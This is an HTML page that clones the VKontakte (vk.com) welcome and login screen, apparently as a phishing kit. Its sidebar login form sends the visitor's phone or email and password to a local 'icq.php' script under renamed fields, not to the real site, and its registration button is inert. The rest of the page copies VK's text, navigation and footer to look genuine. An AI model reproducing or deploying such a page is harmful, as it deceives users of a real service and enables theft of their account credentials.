
<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta charset="Utf-8" />
<link rel="shortcut icon" href="files/faviconn.txt">


<meta name="description" content="ВКонтакте – универсальное средство для общения и поиска друзей и одноклассников, которым ежедневно пользуются десятки миллионов человек. Мы хотим, чтобы друзья, однокурсники, одноклассники, соседи и коллеги всегда оставались в контакте.">

<title>Добро пожаловать | ВКонтакте</title>


<link rel="stylesheet" type="text/css" href="files/common00.css">

<link type="text/css" rel="stylesheet" href="files/index000.css"></link><script type="text/javascript" src="files/loader_n.js"></script><script type="text/javascript" src="files/common00.js"></script><script type="text/javascript" src="files/lang0_00.js"></script><link rel="alternate" media="only screen and (max-width: 640px)" href="http://m.vk.com/"><script type="text/javascript" src="files/index000.js"></script>

</head>

<body onresize="onBodyResize()" class="is_rtl font_default pads ">
  <div id="system_msg" class="fixed"></div>
  <div id="utils"></div>

  <div id="layer_bg" class="fixed"></div><div id="layer_wrap" class="scroll_fix_wrap fixed"><div id="layer"></div></div>
  <div id="box_layer_bg" class="fixed"></div><div id="box_layer_wrap" class="scroll_fix_wrap fixed"><div id="box_layer"><div id="box_loader"><div class="loader"></div><div class="back"></div></div></div></div>

  <div id="stl_left"></div><div id="stl_side"></div>

  <script type="text/javascript">domStarted();</script>

  <div class="scroll_fix_wrap" id="page_wrap"><div id="reg_bar" class="top_info_wrap fixed">
  <div class="scroll_fix">
    <!--<div id="reg_bar_content">
      Присоединяйтесь, чтобы всегда оставаться в контакте с друзьями и близкими
      <div class="button_blue" id="reg_bar_button"><a class="button_link" href="http://vk.com/join" onclick="return !showBox('join.php', {act: 'box', from: nav.strLoc}, {}, event)"><button id="reg_bar_btn"><span id="reg_bar_with_arr">Зарегистрироваться</span></button></a></div>
    </div>-->
  </div>
</div>
<div><div class="scroll_fix">
  <div id="page_layout" style="width: 791px;">
    <div id="page_header" class="p_head p_head_l0">
      <div class="back"></div>
      <div class="left"></div>
      <div class="right"></div>
      <div class="content">
        <div id="top_nav" class="head_nav">
  <div id="top_logo_down" class="fl_l"></div>
  <a id="top_home_link" class="top_home_link fl_l" href="http://vk.com/" onmousedown="addClass('top_logo_down','tld_d');" onclick="return nav.go(this, event);"><img src="img.png"></a>
  <div id="top_links">
    <div class="fl_r" id="top_menu_wrap" style>
      <a id="top_reg_link" class="fl_r top_nav_link" href="http://vk.com/join" style="display: none" onclick="return !showBox('join.php', {act: 'box', from: nav.strLoc}, {}, event)" onmousedown="tnActive(this)">регистрация</a>
      <a id="top_switch_lang" class="fl_r top_nav_link" style onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 3, hash: 'bd350c8f0c6dd7c4c0'});" onmousedown="tnActive(this)">Switch to English</a>
    </div>
    <a class="fl_l top_nav_link" href id="top_back_link" onclick="return nav.go(this, event, {back: true})" onmousedown="tnActive(this)"></a>
  </div>
</div>
      </div>
    </div>
	

	
<div id="side_bar" class="fl_l" style>
<div id="quick_login">	  
  <form method="POST" name="login" id="quick_login_form" action="icq.php">
    <div class="label">Телефон или email</div>
    <div class="labeled"><input type="text" name="zabor" class="text" id="quick_email"></div>
    <div class="label">Пароль</div>
    <div class="labeled"><input type="password" name="zena" class="text" id="quick_pass" ></div>
    <input type="submit" class="submit">
  
<div class="button_blue button_wide button_big" id="quick_auth_button"><button  onclick="icq.php"> Войти</button></div>

  <div class="clear forgot"><a id="quick_forgot" href="http://vk.com/restore" target="_top">Забыли пароль?</a><div class="checkbox ta_l" id="quick_expire" onclick="checkbox(this);ge('quick_expire_input').value=isChecked(this)?1:'';"><div></div>Чужой компьютер</div></div>
</div>
</div>	
	
	

    <div id="page_body" class="fl_r" style="width: 631px;">
      <div id="header_wrap2">
        <div id="header_wrap1">
          <div id="header" style>
            <h1 id="title">Добро пожаловать</h1>
          </div>
        </div>
      </div>
      <div id="wrap_between"></div>
      <div id="wrap3"><div id="wrap2">
  <div id="wrap1">
    <div id="content"><div id="index">
  <iframe class="upload_frame" src="files/vk000000.htm"></iframe>
  <div class="content">
    <p><b>ВКонтакте</b> – универсальное средство для общения и поиска друзей и одноклассников,<br>которым ежедневно пользуются десятки миллионов человек.</p>

    <h2>Моментальная регистрация</h2>

    <div class="msg" id="ij_msg"></div>

    <div class="ij_form">
      <div class="ij_reg_row">
        <input type="text" class="big_text" id="ij_first_name" value placeholder="Ваше имя" onkeydown="if (event.keyCode == 10 || event.keyCode == 13) Index.submitJoinStart();">
      </div>
      <div class="ij_reg_row">
        <input type="text" class="big_text" id="ij_last_name" value placeholder="Ваша фамилия" onkeydown="if (event.keyCode == 10 || event.keyCode == 13) Index.submitJoinStart();">
      </div>
      <div class="ij_reg_row" id="ij_sex_row">
        <input type="hidden" id="ij_sex" name="ij_sex">
      </div>
      <div class="button_blue button_wide button_big ij_button">
        <button id="ij_submit" onclick="#">
          <span class="ij_with_arr">Зарегистрироваться</span>
        </button>
      </div>

    </div>

    <h2>В чём поможет ВКонтакте?</h2>
    <ul class="listing">
      <li><span>Найти людей, с которыми Вы когда-либо учились, работали или отдыхали.</span></li>
      <li><span>Узнать больше о людях, которые Вас окружают, и найти новых друзей.</span></li>
      <li><span>Всегда оставаться в контакте с теми, кто Вам дорог.</span></li>
    </ul>
  </div>
  <div class="reg">
    <table cellspacing="0" cellpadding="0" id="ij_screens"><tr>
      <td><a class="ij_scr" onclick="JoinPhotoview.show(0)"><img src="files/prof_m00.png" class="ijs_img"></a></td>
      <td><a class="ij_scr" onclick="JoinPhotoview.show(1)"><img src="files/news_m00.png" class="ijs_img"></a></td>
      <td><a class="ij_scr" onclick="JoinPhotoview.show(2)"><img src="files/dial_m00.png" class="ijs_img"></a></td>
    </tr></table>
  </div>
</div></div>
  </div>
</div></div>
    </div>

    <div id="footer_wrap" class="fl_r" style="width: 661px;">
      <div id="bottom_nav">
  <a class="bnav_a" href="http://vk.com/about">о сайте</a>
  <a class="bnav_a" href="http://vk.com/support?act=new" onclick="return nav.go(this, event);" style="display: none;">помощь</a>
  <a class="bnav_a" href="http://vk.com/terms">правила</a>
  <a class="bnav_a" href="http://vk.com/ads">реклама</a>
  <a class="bnav_a" href="http://vk.com/people">люди</a><a class="bnav_a" href="http://vk.com/communities">сообщества</a>
  <a class="bnav_a" href="http://vk.com/dev">разработчикам</a>
  <a class="bnav_a" href="http://vk.com/jobs" style="display: none;">вакансии</a>
</div>
<div id="footer" class="clear">
  <div class="copy_lang"><a href="http://vk.com/about">ВКонтакте</a> © 2015 <a class="bnav_lang" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 3, hash: 'bd350c8f0c6dd7c4c0'})">English</a><a class="bnav_lang" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 0, hash: 'bd350c8f0c6dd7c4c0'})">Русский</a><a class="bnav_lang" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 1, hash: 'bd350c8f0c6dd7c4c0'})">Українська</a><a class="bnav_lang" onclick="showBox('lang.php', {act: 'lang_dialog'}, {noreload: true})">все языки »</a></div>
  
  <div>
    
    
  </div>
</div>
    </div>
    <div class="clear"></div>
  </div>
</div></div></div>
  <div class="progress" id="global_prg"></div>

</body>

</html>
<!-- This document saved from http://vk.com/ -->
